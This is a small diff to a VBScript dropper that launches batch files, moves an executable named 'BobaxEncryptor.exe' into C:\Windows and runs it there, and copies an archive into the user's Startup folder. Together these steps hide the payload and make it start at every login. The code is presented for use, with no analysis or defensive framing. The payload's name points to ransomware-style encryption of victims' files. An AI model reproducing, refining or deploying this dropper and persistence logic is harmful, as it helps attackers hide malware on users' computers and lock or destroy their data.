@@ -12,8 +12,11 @@ CreateObject("Wscript.Shell").Run """111.bat""", 1, True
 CreateObject("Wscript.Shell").Run """file.bat""", 1, True
 
 
-FSO.Movefile "BobaxEncryptor.exe","C:\"
-CreateObject("Wscript.Shell").Run """C:\BobaxEncryptor.exe""", 1, True
+
+fso.MoveFile "BobaxEncryptor.exe", "C:\Windows"
+CreateObject("Wscript.Shell").Run """C:\Windows\BobaxEncryptor.exe""", 1, True
+
+
 
 '''OH LORD
 FSO.Movefile "Master.7z","%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
